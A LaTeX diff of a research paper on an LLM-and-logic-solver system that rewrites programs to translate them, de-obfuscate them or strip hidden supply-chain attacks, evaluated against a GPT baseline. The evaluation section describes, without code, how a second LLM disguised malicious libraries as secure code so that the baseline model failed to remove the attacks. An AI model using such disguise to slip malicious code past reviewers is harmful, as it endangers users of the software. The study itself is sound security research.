 This prompt is then passed to an LLM instance.
-\sys does not include by default the original program's source code in the prompt.
-Instead, it uses the extracted properties to guide the LLM instance 
-to synthesize a candidate program that satisfies the specified constraints.
 
@@
 synthesized program satisfies the target properties.
-If verification fails---due to a violated constraint or behavioral divergence---\sys uses this
+If verification fails---due to a violated constraint---\sys uses this
 failure as a signal to refine the plan or re-sample the synthesis step.
@@
 They form the basis of both planning and verification.
-All aspects of the symbolic representation are expressed as answer-set programming (ASP) facts and rules (an example program is shown in \cref{lst:logic-example})~\cite{Eiter_2009}.
+All aspects of the symbolic representation are expressed as logic facts and rules (an example program is shown in \cref{lst:logic-example}).
+
+\begin{listing}[t]
+  \begin{minted}[frame=lines, fontsize=\small]{prolog}
+% --- Base program facts ---
+language(p, c).
+
+% --- Plugin: len ---
+can(len(p)). 
+% Plugin: signature ---
+can(signature(p)).
+% ---  Plugin: tr ---
+can(tr(p, haskell)).
+  do(language(p, haskell)) :- do(tr(p, haskell)).
+% ---- Axioms ----
+:- X, not can(X). % All transformations must be possible
+:- language(p, L1), language(p, L2)),
+    L1 != L2. % A program can have one language
+
+% --- User query ---
+#min len(p). % User query
+\end{minted}
+  \caption{\textbf{Example \sys logic program.}
+  This is a lightly simplified version of the logic program that produces the plan for the idiomatization task in \cref{sec:example}. 
+  The program contains facts coming from (1) the input program (written in C),
+  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{tr}),
+  (3) axioms from the logic engine (\eg a program can have one language, an analysis will be applied only if possible, all goals must be satisfied), and
+  (4) the user query (the user wants to minimize the program's length).
+  }
+  \label{lst:logic-example}
+\end{listing}
+
+% To compute answer sets, ASP programs are input into ASP solvers.
+% These solvers provide efficient mechanisms to generate the set of valid answers to the given problem.
+% An ASP solver can be thought of as a black box, with them being interchangeable as 
+% long as the input language semantics remain the same.
+
+\heading{Property predicates}
+Each property is a logical predicate over the program symbol $p$,
+or a derivative symbol extracted from $p$.
+For example, 
+the \ttt{language}$(p, \ttt{javascript})$ predicate describes that the input program is written in JavaScript.
+The \ttt{fsignt}$(p, S)$ predicate is used to extract well-formed function signature $S$ when the program \ttt{p} exposes one.
+If the user wanted to refer to each function in the program, they could 
+combine the predicates \ttt{func(F, p)} and \ttt{fsignt(F, S)} in a single rule in their query.
+The \ttt{pure}$(p)$ predicate can be used as a contraint
+to signify that the regenerate program
+should not have side-effects (\eg file system access, network calls, \etc).
+
+A property $X$ appears as either an
+  plugin-provided $\mathsf{can}(X)$ atom, which denotes that the system is capable of extracting or inferring property $X$ from the input.
+  A pure $X$ atom denotes that either the user has explicitly requested property $X$ to be enforced, or the planner has deduced that it is necessary to satisfy the query.
+
+\sys also supports minimization, maximization and elimination of properties
+through the $\mathsf{min}$, $\mathsf{max}$, and $\mathsf{not}$ directives.
+
+\heading{Planning over properties}
+The logic engine determines the set of active properties to enforce by solving
+a constrained optimization problem over the extractable property set $P_r$.
+It satisfies the
+following key constraint:
+\begin{align*}
+  X &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
+\end{align*}
+
+Additionally, the system takes advantage of ASP's least stable model semantics.
+Essentially, the planner tries to give the synthesizer the least amount of information
+possible, as long as all regeneration goals are fulfilled.
+
+\heading{Plugin-defined rules}
+Plugins can also contribute domain-specific inference rules and constraints.
+For example, a plugin for JavaScript-to-Haskell translation may define:
+\begin{align*}
+\mathsf{can}(\ttt{translate}_{\ttt{js} \rightarrow \ttt{hs}}(p)) & \\
+\ttt{translate}_{\ttt{js} \rightarrow \ttt{hs}}(p) &\Rightarrow \ttt{language}(p, \ttt{haskell}) \\
+\ttt{translate}_{\ttt{js} \rightarrow \ttt{hs}}(p) &\Rightarrow \mathsf{language}(p, \ttt{javascript})
+\end{align*}
+Intuitively, these rules mean (1) that the system is able to apply the plugin,
+and (2) it can only be applied if the original program is written in JavaScript, 
+and the regenerated program \emph{must} be written in Haskell.
+
+\heading{Axioms and domain knowledge}
+The logic engine also includes domain-wide axioms based on some common assumptions.
+For example
+$\ttt{language}(p, \ttt{haskell}) \Rightarrow \ttt{pure}(p)$
+captures the assumption that programs written in Haskell are pure by default.
+Such axioms allow inferred properties to trigger downstream constraints or synthesis behaviors.
+
+\heading{Compilation to ASP}
+Given a source program written in the \sys query language, the compiler performs a syntactic
+de-sugaring into ASP rules~(\cref{fig:asp-compilation}).
+
+\begin{figure}[t]
+\centering
+\small
+\begin{tabular}{l}
+\textbf{toasp} (q : Query) : ASPCode {$\leftarrow$} \textbf{match} q \textbf{with} \\[0.5ex]
+\quad \textbar~$X$: ungroundable($X$) {$\rightarrow$} \ttt{do(}$X$\ttt{)} \\
+\quad \textbar~\#\ttt{min}~$X$ {$\rightarrow$} \ttt{do\_min(}$X$\ttt{)} \\
+\quad \textbar~\#\ttt{max}~$X$ {$\rightarrow$} \ttt{do\_max(}$X$\ttt{)} \\
+\textbf{end}
+\end{tabular}
+\caption{DSL-to-ASP compilation rules. Ungroundable atoms are wrapped in \ttt{do} to denote candidate actions. Optimization directives are compiled to \ttt{do\_min} and \ttt{do\_max}.}
+\label{fig:asp-compilation}
+\end{figure}
+
+These transformations yield a groundable ASP program that can be evaluated by the backend ASP solver.
+
+% TODO: Show graph showing how properties go from the abstract logic domain to the real domain through a translation barrier
+\heading{Logic and concrete space}
+\sys operates at the boundary between two representational domains: a symbolic
+\emph{logic space}, where transformations over program properties are expressed, and
+a \emph{concrete space}, where actual programs, inputs, outputs, and traces
+reside.
+
+In the logic space, properties are encoded as predicates over abstract program
+identifiers.
+To bridge this abstraction gap, \sys given the set of true predicates
+from the logic space, extracts the corresponding concrete properties from the
+source program.
+For example, the predicate $\ttt{inputs}(p, I)$ in the logic space
+will be concertized to set of inputs $I$ by invoking the \ttt{input} plugin,
+which uses an LLM to generate a set of inputs for the program $p$.
+Similarly, the predicate $\ttt{graph}(p, I, O)$ will be concertized to a set of
+input-output pairs $(I, O)$ by executing the program $p$ on the inputs $I$ and
+recording the outputs $O$.
+After regeneration, the predicates over the concrete regenerated program $p\_$
+will be checked regarding their relationship to the same properties over program $p$
+in the logic space.
+An equality relationship is one where the predicate's grounded version
+$X$ is the same between the two programs, modulo the program identifier~(\eg, $\ttt{graph}(p, i, o) \equiv \ttt{graph}(p\_, i, o)$).
+Equality is defined differently for each property, and is enforced by the corresponding plugin.
+Similarly, minimization and maximization relationships are defined as
+the concrete property value being less than or greater than the original program's value, respectively.
+Again, the less-than and greater-than operators are defined by the plugin that verifies the property.
+
+% In the current \sys implementation, this translation is one-way,
+% however the system can be extended to support two-way translation, where properties extracted
+% can be used to generate new properties in the logic space.
+
+As shown in \cref{fig:logic-to-concrete}, this process constitutes a
+translation barrier: declarative goals over properties like \ttt{inputs},
+\ttt{outputs}, and \ttt{traces} are realized through observation and
+instrumentation. Once aligned, the logic engine can reason over these grounded
+facts to drive transformation.
+
+\begin{figure}[t]
+\centering
+  % https://docs.google.com/drawings/d/1JdOfgpaVUy7_EgFyguRXHxFKdmZwyHaiHshnifHG0TQ/edit?usp=sharing
+  \includegraphics[width=.9\columnwidth]{figs/kvasir_logic-space.pdf}
+  \caption{\textbf{\sys transforms a program over its properties from the abstract logic space to the concrete space.}
+  Relationships between original and regenerated program's properties are inferred 
+  from the query in combination with the knowledge base and enforced by \sys plugins.
+  }
+  \label{fig:logic-to-concrete}
+\end{figure}
+
+\heading{Extensibility}
+\sys decentralizes property extraction: plugins contribute $\mathsf{can}(\cdot)$ facts, and pre- and post-conditions, while the core planner resolves which properties to enforce based on goals, capabilities, and axioms.
+This allows many different types of analyses (language-aware, language-agnostic, or LLM-assisted)
+to coexist in a unified planning layer.
 
 \heading{Answer Set Programming}
+The \sys prototype compiles each input query to an answer-set programming (ASP) program~\cite{Eiter_2009}.
+A brief introduction to the paradigm follows.
 ASP \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
@@
 
-The syntax, similar to that of \textit{Prolog} and \textit{Datalog}, with code and data being represented
-through logical terms. Collections of logical terms, as seen in
-\cref{lst:terms}, can represent the game world's state. Rules, expressed using
-the \texttt{:-} operator, enable complex reasoning by defining relationships
-between atoms. Choice rules, exemplified in \cref{lst:choice}, allow the ASP
-solver to make selections among atoms. Integrity constraints, as shown in
+The syntax is similar to \textit{Prolog} and \textit{Datalog}, with code and data being represented
+through logical terms.
+Collections of logical terms, as seen in
+\cref{lst:terms}, can represent the program and its properties.
+Rules, expressed using
+the \ttt{:-} operator, enable complex reasoning by defining relationships
+between atoms.
+Choice rules, exemplified in \cref{lst:choice}, allow the ASP
+solver to make selections among atoms.
+Integrity constraints, as shown in
 \cref{lst:constraint}, can restrict invalid answer sets. Optimization
-directives, such as \texttt{\#minimize} and \texttt{\#maximize} in
-\cref{lst:optimization}, guide the solver to output optimal answer sets.
+directives, such as \ttt{\#minimize} and \ttt{\#maximize} in
+\cref{lst:optimization}, guide the solver to output optimal answer sets,
+with respect to a given metric (\eg the number of properties to be extracted from the input program).
 
@@
 \caption{Examples of optimization directives.
-Note that this differs from \sys's \texttt{\#min} or \texttt{\#max} directives, which is used to direct the synthesizer to minimize a property of the program but has no effect on the produced answer set.}
+Note that this differs from \sys's \ttt{\#min} or \ttt{\#max} directives, which is used to direct the synthesizer to minimize a program's property but has no effect on the produced answer set.}
 \label{lst:optimization}
 \end{listing}
-
-% To compute answer sets, ASP programs are input into ASP solvers.
-% These solvers provide efficient mechanisms to generate the set of valid answers to the given problem.
-% An ASP solver can be thought of as a black box, with them being interchangeable as 
-% long as the input language semantics remain the same.
-
-\heading{Property predicates}
-Each property is a logical predicate over the program symbol $p$. Examples include:
-\begin{itemize}
-  \item \texttt{language}$(p, \texttt{javascript})$: the input program is written in JavaScript.
-  \item \texttt{signature}$(p, S)$: the program exposes a well-formed function signature $S$.
-  \item \texttt{pure}$(p)$: the program does not have side-effects (\eg file system access, network calls, \etc).
-\end{itemize}
-
-A property $X$ appears as either an
-  $\mathsf{can}(X)$ atom, which denotes that the system is capable of extracting or inferring property $X$ from the input.
-  Plugins add these facts and represent the system's capabilities.
-  A pure $X$ atom denotes that either the user has explicitly requested property $X$ to be enforced, or the planner has deduced that it is necessary to satisfy the query.
-
-\heading{Planning over properties}
-The logic engine determines the set of active properties to enforce by solving
-a constrained optimization problem over the property set $P_r$.
-It satisfies the
-following key constraint:
-\begin{align*}
-  X &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
-\end{align*}
-\sys also supports minimization, maximization and elimination of properties
-through the $\mathsf{min}$, $\mathsf{max}$, and $\mathsf{not}$ directives.
-Without loss of generality, the base case is described, explicitly mentioning any significant semantic difference when necessary.
-
-Additionally, the system takes advantage of ASP's least stable model semantics.
-Essentially, the planner tries to give the synthesizer the least amount of information
-possible, as long as all regeneration goals are fulfilled.
-
-\heading{Plugin-defined rules}
-Plugins contribute domain-specific inference rules and constraints. For example, a plugin for JavaScript-to-Haskell translation may define:
-\begin{align*}
-\mathsf{can}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) & \\
-\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p) &\Rightarrow \texttt{language}(p, \texttt{haskell}) \\
-\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p) &\Rightarrow \mathsf{language}(p, \texttt{javascript})
-\end{align*}
-Another plugin might contribute $\mathsf{can}(\texttt{signature}(p))$, indicating it can extract the function signature.
-At this stage, \sys only cares about semantics of each plugin in relation to how it might enable or violate
-other properties in the regenerated program.
-
-\heading{Axioms and domain knowledge}
-The logic engine also includes domain-wide axioms based on some common assumptions.
-For example
-$\texttt{language}(p, \texttt{haskell}) \Rightarrow \texttt{pure}(p)$
-captures the assumption that programs written in Haskell are pure by default.
-Such axioms allow inferred properties to trigger downstream constraints or synthesis behaviors.
-
-\begin{listing}
-  \begin{minted}[frame=lines, fontsize=\small]{prolog}
-% --- Base program facts ---
-language(p, c).
-
-% --- Plugin: len ---
-can(len(p)). 
-% Plugin: signature ---
-can(signature(p)).
-% ---  Plugin: llm_translate ---
-can(llm_translate(p, haskell)).
-  do(language(p, haskell)) :- do(llm_translate(p, haskell)).
-% ---- Axioms ----
-:- X, not can(X). % All transformations must be possible
-:- language(p, L1), language(p, L2)),
-    L1 != L2. % A program can have one language
-
-% --- User query ---
-#min len(p). % User query
-\end{minted}
-  \caption{\textbf{Example \sys logic program.}
-  This is a lightly simplified version of the logic program that produces the plan for the idiomatization task~(\cref{sec:example}). 
-  The program contains facts coming from (1) the input program (written in C),
-  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{llm\_translate}),
-  (3) axioms from the logic engine (\eg a program can have one language, an analysis will be applied only if possible, all goals must be satisfied), and
-  (4) the user query (the user wants to minimize the length of the program).
-  }
-  \label{lst:logic-example}
-\end{listing}
-
-\heading{Compilation to ASP}
-Given a source program written in the \sys query language, the compiler performs a syntactic
-de-sugaring into ASP rules~(\cref{fig:asp-compilation}).
-
-\begin{figure}[htpb]
-\centering
-\small
-\begin{tabular}{l}
-\textbf{toasp} (q : Query) : ASPCode {$\leftarrow$} \textbf{match} q \textbf{with} \\[0.5ex]
-\quad \textbar~$X$: ungroundable($X$) {$\rightarrow$} \texttt{do(}$X$\texttt{)} \\
-\quad \textbar~\#\texttt{min}~$X$ {$\rightarrow$} \texttt{do\_min(}$X$\texttt{)} \\
-\quad \textbar~\#\texttt{max}~$X$ {$\rightarrow$} \texttt{do\_max(}$X$\texttt{)} \\
-\textbf{end}
-\end{tabular}
-\caption{DSL-to-ASP compilation rules. Ungroundable atoms are wrapped in \texttt{do} to denote candidate actions. Optimization directives are compiled to \texttt{do\_min} and \texttt{do\_max}.}
-\label{fig:asp-compilation}
-\end{figure}
-
-These transformations yield a groundable ASP program that can be evaluated by the backend ASP solver.
-
-% TODO: Show graph showing how properties go from the abstract logic domain to the real domain through a translation barrier
-\heading{Logic and concrete space}
-\sys operates at the boundary between two representational domains: a symbolic
-\emph{logic space}, where transformations over program properties are expressed, and
-a \emph{concrete space}, where actual programs, inputs, outputs, and traces
-reside.
-
-In the logic space, properties are encoded as predicates over abstract program
-identifiers.
-To bridge this abstraction gap, \sys given the set of true predicates
-from the logic space, extracts the corresponding concrete properties from the
-source program.
-For example, the predicate $\texttt{inputs}(p, I)$ in the logic space
-will be concertized to set of inputs $I$ by invoking the \texttt{input} plugin,
-which uses an LLM to generate a set of inputs for the program $p$.
-Similarly, the predicate $\texttt{graph}(p, I, O)$ will be concertized to a set of
-input-output pairs $(I, O)$ by executing the program $p$ on the inputs $I$ and
-recording the outputs $O$.
-After regeneration, the predicates over the concrete regenerated program $p\_$
-will be checked regarding their relationship to the same properties over program $p$
-in the logic space.
-An equality relationship is one where the grounded version of the predicate
-$X$ is the same between the two programs, modulo the program identifier~(\eg, $\texttt{graph}(p, i, o) \equiv \texttt{graph}(p\_, i, o)$).
-Equality is defined differently for each property, and is enforced by the corresponding plugin.
-Similarly, minimization and maximization relationships are defined as
-the concrete property value being less than or greater than the original program's value, respectively.
-Again, the less-than and greater-than operators are defined by the plugin that verifies the property.
-
-% In the current \sys implementation, this translation is one-way,
-% however the system can be extended to support two-way translation, where properties extracted
-% can be used to generate new properties in the logic space.
-
-As shown in \cref{fig:logic-to-concrete}, this process constitutes a
-translation barrier: declarative goals over properties like \texttt{inputs},
-\texttt{outputs}, and \texttt{traces} are realized through observation and
-instrumentation. Once aligned, the logic engine can reason over these grounded
-facts to drive transformation.
-
-\begin{figure}[t]
-\centering
-  % https://docs.google.com/drawings/d/1JdOfgpaVUy7_EgFyguRXHxFKdmZwyHaiHshnifHG0TQ/edit?usp=sharing
-  \includegraphics[width=.9\columnwidth]{figs/kvasir_logic-space.pdf}
-  \caption{\textbf{\sys transforms a program over its properties from the abstract logic space to the concrete space.}
-  Relationships between properties of the original and regenerated program are inferred 
-  from the query in combination with the knowledge base and enforced by \sys plugins.
-  }
-  \label{fig:logic-to-concrete}
-\end{figure}
-
-\heading{Extensibility}
-\sys decentralizes property extraction: plugins contribute $\mathsf{can}(\cdot)$ facts, and pre- and post-conditions, while the core planner resolves which properties to enforce based on goals, capabilities, and axioms.
-This modularity allows language-specific analyses to coexist with general-purpose reasoning in a unified planning layer.
 
@@
 reflect both user goals (\eg removing side effects, translating to a
-different language) and structural characteristics of the input program that
+different language) and the input program's structural characteristics that
 the synthesizer will preserve.
@@
 For instance, a plan for regenerating a specific function $f$ might include:
-\texttt{language}(f, \texttt{haskell}) the function must be written in Haskell, 
-\texttt{pure}(f)) the function must be side-effect-free, and 
-\texttt{signature}(f, s)) the function must keep the original program's signature $s$.
+\ttt{language}(f, \ttt{haskell}) the function must be written in Haskell, 
+\ttt{pure}(f)) the function must be side-effect-free, and 
+\ttt{signature}(f, s)) the function must keep the original program's signature $s$.
 
@@
  \promptbox{
-   {The output should implement a function \texttt{sqrt(n: float): float}.}
+   {The output should implement a function \ttt{sqrt(n: float): float}.}
  }
@@
 }
-A \ttt{llm_translate} plugin given that the output program must be written in Haskell, may prepend:
+A \ttt{tr} plugin given that the output program must be written in Haskell, may prepend:
 
@@
 provides feedback for refining or retrying those that do not.
+Checkers are contributed by plugins.
 
@@
 of precision---ranging from structural pattern checks to light static or
-symbolic analysis---and are tailored to the property type.
-
-Examples include:
-\begin{itemize}
-  \item For $\texttt{no\_network}(f)$, the checker confirms the absence of known network APIs or imports.
-  \item For $\texttt{signature}(f)$, the checker matches the regenerated function's name, parameters, and arity against the extracted signature.
-\end{itemize}
-
-Checkers are modular and contributed by plugins.
-Their combined results determine whether a candidate is considered valid under the current plan.
-For minimization and maximization goals, the verification phase uses the less-than or greater-than operators as are defined internally by the plugin verifying the given property.
-Verification in this case checks if the property's value has decreased or increased compared 
+symbolic analysis.
+Examples from the \sys prototype include:
+  $\ttt{no\_network}(f)$, the checker confirms the absence of known network APIs or imports using static analysis~\cite{mir:ccs:2021};
+  $\ttt{fsignt}(f)$, the checker matches the regenerated function's name, parameters, and arity against the extracted signature.
+
+For minimization and maximization goals, the verification phase uses the less-than or greater-than operators as are defined internally by the verifier.
+Verification in this case means if the property's value has decreased or increased compared 
 to the previous regeneration attempt.
 If the value remains unchanged for two consecutive attempts, its considered satisfied.
-Its important that certain properties that are not easily verifiable, such as \ttt{pure}, 
-do not correspond to a specific verifier, but rather influence what kind of propoerties can be extracted 
-otherwise to make sure they are not violated during regeneration.
-For this example, a system call trace of the program will not be provided to the LLM instance, 
-as that could encode side-effects present in the original program.
 
@@
 Instead of discarding the regeneration attempt wholesale, the system uses the failure to revise or re-execute the synthesis phase.
-The forms are:
-\begin{itemize}
-  \item \emph{Retrying synthesis}: A fresh LLM call with the same plan but a different generation path.
-  \item \emph{Feedback loop}: \sys will provide the previous regeneration attempt 
+\sys implements three strategies to handle regeneration failures:
+  (1) \emph{retrying synthesis}: a fresh LLM call with the same plan but a different generation path.
+  (2) \emph{feedback loop}: \sys will provide the previous regeneration attempt 
     as an additional context to the LLM, together with an explanation of the properties that the regeneration violates.
-    A key assumption is that the output will not to taint followup regeneration attempts,
-    which should hold based on the synthesis plan, which takes query and plugin constraints into account.
-  \item \emph{Fallback handling}: If a function fails validation three times, \sys leaves the original version intact or mark it for manual inspection.
-\end{itemize}
+  (3) \emph{fallback handling}: if a function fails validation three times, \sys leaves the original version intact or mark it for manual inspection.
 
@@
 
+\begin{table*}[t]
+\centering
+  \caption{\textbf{Benchmark summary}. 
+  Benchmark programs come from online repositories, public archives, security research datasets, and often referenced examples in programming culture.
+The N column shows the number of programs/functions from each benchmark;
+the LoC column shows the total lines of code across all programs in the benchmark;
+the Task column describes the regeneration task;
+  the Language column shows the languages used in the benchmark programs (JS = JavaScript, Py = Python, C = C, HS = Haskell);
+}
+  \begin{tabular*}{\textwidth}{llrrlll}
+\toprule
+    Benchmark                          & Description                              & N  & LoC & Task               & Language & Source \\
+\midrule
+Rosetta Code                       & Simple tasks                             & 16 & 120 & Translation            & C, JS, Py, HS & \cite{rosettacode} \\
+Short utilities                    & npm/PyPi utilities                       & 13 & 1079& Parity                 & JS, Py & \cite{regbench2025} \\
+SSCA                               & Sneaky supply-chain attacks              & 3  & 1019& Attack elimination     & JS & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
+IOCCC                              & Obfuscated C code                        & 2  & 195 & De-obfuscation         & C & \cite{ioccc} \\
+Microbenchmarks                    &                                          & 3  &     &                        & & \\
+\hspace{.5em} \ttt{flatmap-stream} & Flat-map utility                         &    & 214 & Purity and translation & JS, HS & \cite{es1}  \\
+\hspace{.5em} \ttt{Q\_rsqrt}       & Inverse square root function             &    & 16  & Idiomatic rewrite      & C & \cite{fast_inv_sqrt}  \\
+\hspace{.5em} \textsf{rigidDB}     & A music database &    & 33  & Modularization         & JS & \cite{codewithsadeemusicplayer} \\
+\midrule
+Total                              &                                          & 37 & 2676&                        & & \\
+\bottomrule
+\end{tabular*}
+\label{tab:benchmarks}
+\end{table*}
+
 \section{Evaluation}
@@
 The \sys evaluation comprises of six benchmark suites, summarized in \cref{tab:benchmarks}.
-Each task consists of an input program, a \sys query expressing desired
+Each benchmark task consists of an input program, a \sys query expressing desired
 properties, and a test suite or functional oracle.
@@
 popularity in programming culture, and their tractability given the implemented \sys plugins.
-The Rosetta Code~\cite{rosettacode} benchmarks include four programming tasks written in four different
+
+The \textit{Rosetta Code}~\cite{rosettacode} benchmarks include four programming tasks written in four different
 languages each (Python, JavaScript, C, and Haskell). 
-These include classic programs that do not require any language-specific features to implement.
-These are: the classic \emph{Hello, World!} program as found in most programming tutorials,
+These include classic programs like
+the classic \emph{Hello, World!} program as found in most programming tutorials,
 a program that applies the ROT-13 cipher to a string,
@@
 and a program that reads a file and prints its contents to the console line-by-line.
-The npm benchmark includes ten popular (100.000+ weekly downloads) npm packages that implement utility
+The \textit{short utilities} benchmark includes 13 utility programs from npm and PyPi.
+The npm sub-benchmark includes ten popular npm packages (more than 100k weekly downloads) that implement utility
 functionality such as string manipulation, data structure transformations, and math.
-Similarly, the PyPi utilities benchmark includes three functions sourced from PyPi that implement similar functionality.
-The SSCA dataset includes three sneaky supply-chain attacks that obfuscate malicious behavior in otherwise innocuous-looking code.
-The attack activates under specific environment conditions, such as the presence of a specific environment variable or specific inputs
-getting passed to the program.
-The attacks involve private key stealing~\cite{ohm2020backstabber}, Bitcoin private key theft~\cite{ev:eurosec:2022}, and an SSH backdoor installation~\cite{copeland2019frightening}
-and occur while the program still performs its advertised functionality.
-The IOCCC benchmark includes two programs from the International Obfuscated C Code Contest (IOCCC)~\cite{ioccc}.
-These programs are intentionally obfuscated, using advanced techniques such as bit manipulation, undefined behavior,
-and exploitation of the C preprocessor and the lax parsing rules of the C language.
+Similarly, the PyPi sub-benchmark includes three functions sourced from PyPi that implement utility functionality.
+The \textit{SSCA} benchmark includes three high-profile sneaky supply-chain attacks that obfuscate malicious behavior in otherwise innocuous-looking code that also performs its advertised functionality.
+The attack activates under specific environment conditions, such as the presence of a specific environment variable or specific function inputs.
+They involve private key stealing~\cite{ohm2020backstabber}, Bitcoin private key theft~\cite{ev:eurosec:2022}, and an SSH backdoor installation~\cite{copeland2019frightening}
+The \textit{IOCCC} benchmark includes two programs from the International Obfuscated C Code Contest (IOCCC)~\cite{ioccc}.
+These programs are intentionally obfuscated, using advanced techniques such as bit manipulation,
+and exploitation of the C preprocessor and the C language's lax parsing rules.
 These programs perform mathematical computations like Mersenne primality testing and adding two numbers.
-Finally, the microbenchmarks include three programs that implement the regeneration tasks discussed in \cref{sec:example}.
-
-\begin{table*}[htpb]
-\centering
-  \caption{\textbf{Benchmark summary}. 
-  Benchmark programs come from online repositories, public archives, security research datasets, and often referenced examples in programming culture.
-The N column shows the number of programs/functions from each benchmark.
-}
-  \begin{tabular*}{\textwidth}{llrrll}
-\toprule
-Benchmark                          & Description                              & N  & LoC & Task                   & Source \\
-\midrule
-Rosetta Code                       & Simple tasks                             & 16 & 120 & Translation            & \cite{rosettacode} \\
-Short utilities                    & npm/PyPi utilities                       & 13 & 1079& Parity                 & \cite{regbench2025} \\
-SSCA                               & Sneaky supply-chain attacks              & 3  & 1019& Attack elimination     & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
-IOCCC                              & Obfuscated C code                        & 2  & 195 & De-obfuscation         & \cite{ioccc} \\
-Microbenchmarks                    &                                          & 3  &     &                        & \\
-\hspace{.5em} \ttt{flatmap-stream} & Flat-map utility                         &    & 214 & Purity and translation & \cite{es1}  \\
-\hspace{.5em} \ttt{Q\_rsqrt}       & Inverse square root function             &    & 16  & Idiomatic rewrite      & \cite{fast_inv_sqrt}  \\
-\hspace{.5em} \textsf{rigidDB}     & Fetch artist songs from a music database &    & 33  & Modularization         & \cite{codewithsadeemusicplayer} \\
-\midrule
-Total                              &                                          & 37 & 2676&                        & \\
-\bottomrule
-\end{tabular*}
-\label{tab:benchmarks}
-\end{table*}
+Finally, microbenchmarks include the three programs already discussed in \cref{sec:example}.
 
@@
 
-\sys successfully regenerates all programs in the Rosetta Code benchmark suite,
-having verified manually that the output is functionally equivalent
-to the original, using both the original and translated reference
-implementations as guides.
-\sys regenerates correctly all npm and PyPi utilities, it does not introduce and side-effectful or malicious behavior.
+\sys successfully regenerates all programs in the \textit{Rosetta Code} benchmark suite
+based on manual verification that the output is functionally equivalent
+to the original, using both the original and translated reference implementations as guides.
+\sys regenerates correctly all npm and PyPi utilities and it does not introduce and side-effectful or malicious behavior.
 The synthesized programs reveal interesting insights and patterns.
@@
 implemented by library developers, such as early exits or caching.
-For instance, the \texttt{left-pad} library, pre-computes padding for strings below a certain length
+For instance, the \ttt{left-pad} library, pre-computes padding for strings below a certain length
 and returns it directly.
@@
 \sys also omits domain-specific knowledge:
-\sys-generated code frequently fails to account for all edge cases when they involve language-specific features (\eg \ttt{is-nan}).
-% \sys has weak performance on libraries that involve complex regexes or perform non-trivial math.
-For the SSCA benchmarks, \sys successfully regenerates all three malicious libraries, removing the malicious behavior while preserving the original functionality.
-For the flatmap-stream attack, \sys uses domain-specific logic (encoded in its knowledge-base by the \ttt{js-stream} plugin) to generate a function that produces a node \ttt{Stream} object.
-For the IOCCC benchmarks, \sys regenerates the \ttt{adder} program, which is a simple program that adds two numbers,
+\sys-generated code frequently fails to account for all edge cases when they involve language-specific features (\eg \ttt{is-nan}), where there is a shortcut for determining 
+the \ttt{NaN}-ity of a value (\ttt{value !== value;}).
+For the \textit{SSCA} benchmarks, \sys successfully regenerates all three malicious libraries, removing the malicious behavior while preserving the original functionality.
+For the flatmap-stream attack, \sys uses domain-specific logic (encoded in its knowledge-base by the \ttt{js-stream} utility plugin) to generate a function that produces a node \ttt{Stream} object.
+For the \textit{IOCCC} benchmarks, \sys regenerates the \ttt{adder} program, which is a simple program that adds two numbers,
 it also regenerates \ttt{mersenne} in regards that it correctly performs a naive Mersenne primality testing, but it does not follow the non-obvious output scheme of the original program, which returns a non-zero hexadecimal number when $2^p - 1$ ($p$ being the input number) is not prime.
 For the microbenchmarks, \sys correctly regenerates the \ttt{flatmap-stream} program, producing a safe Haskell version that is idiomatic and preserves the original functionality.
-However, this version does not match exactly the semantics of the original one, as it operates over infinitely nested lists, rather than only one level deep ones.
+However, this version does not match exactly the original one's semantics, as it operates over infinitely nested lists, rather than only one level deep ones.
 Thus, a $.5$ score in correctness is given.
-The \ttt{Q\_rsqrt} program includes the obvious, idiomatic computation of the inverse square root ($1/\sqrt{x}$) rather than the original bit-level manipulation.
+The \ttt{Q\_rsqrt} program includes the obvious, idiomatic inverse square root computation ($1/\sqrt{x}$) rather than the original Newton's method implemented through bit-level manipulation.
 Finally, \sys successfully decomposes the \ttt{rigidDB} program into two
@@
 
-\sys is able to regenerate programs that are correct and preserve the original functionality,
-while also removing any malicious behavior or obfuscation.
-Failure cases highlight current limitations, and inspire future work~(\cref{sec:discussion}).
-
 \subsection{Q2: Naive LLM vs. \sys}
@@
 For the Rosetta Code benchmarks, \gptmodel 
-successful in all language translation tasks.
-The original and LLM-generated code matches the semantics
-of the original one, confirmed after manually inspecting the generated code.
+is successful in all language translation tasks.
+The LLM-generated code matches the
+original one's semantics, confirmed after manually inspecting the generated code.
 Similarly, the LLM was successful in transforming the npm and PyPi utilities towards
-removing any vulnerabilities from them, as they are benign and the transformation
-involved the LLM simply repeating the original code without any changes.
-The SSCA benchmark tasks are more interesting, as they involve 
-malicious code. For the malicious libraries, we provide the LLM 
-with two different versions. One is the original high-profile attack that appeared on npm,
-with the second one being an attack that is semantically equivalent but with the source 
+\say{removing} any vulnerabilities from them, as they are benign and the transformation
+involved the LLM simply outputting the original source code.
+For the malicious libraries in the \textit{SSCA} benchmark, we provide the LLM 
+with two different versions.
+One is the original high-profile attack that appeared on npm
+and the second one is an attack that is semantically equivalent to the first but with the source 
 having gone through an iterative loop where a second LLM is tasked with making the code ostensibly 
-secure. This involves adding integrity checks at all points in the program where a value is used.
+secure~\cite{xu2023llmfoolitselfpromptbased}.
+The second LLM instance added many integrity checks at all points in the program where a value is used and used variable names like \ttt{SAFE\_VALUE}.
 \gptmodel was successful in eliminating the original attacks, but failed in \emph{all} 
@@
 the original functionality and the attack.
-For the IOCCC benchmarks, \gptmodel also fails 
+For the \textit{IOCCC} benchmarks, \gptmodel also fails 
 in both cases to regenerate the programs in a way where the code's 
@@
 computes the inverse square root, rather trying to minimize the number of lines in the program
-by removing constants and comments and still keeping the bit-level manipulation.
+by removing constants and comments while keeping the unidiomatic bit-level manipulation and use of magic numbers.
 Finally, for the \ttt{rigidDB} program, \gptmodel is able to decompose the original program into two functions
@@
 
-\sys consistently outperforms a \gptmodel baseline,
-overcoming the inherent weaknesses of a purely prompt-based approach.
